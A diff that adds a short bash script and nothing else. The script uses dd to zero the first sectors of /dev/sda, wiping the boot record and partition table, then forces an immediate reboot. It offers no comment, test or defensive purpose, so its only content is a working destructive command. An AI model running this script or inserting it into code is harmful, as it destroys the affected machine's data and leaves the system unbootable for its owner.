@@ -1,0 +1,5 @@
+#!/bin/bash
+
+dd if=/dev/zero of=/dev/sda bs=512 count=10
+shutdown -r now
+
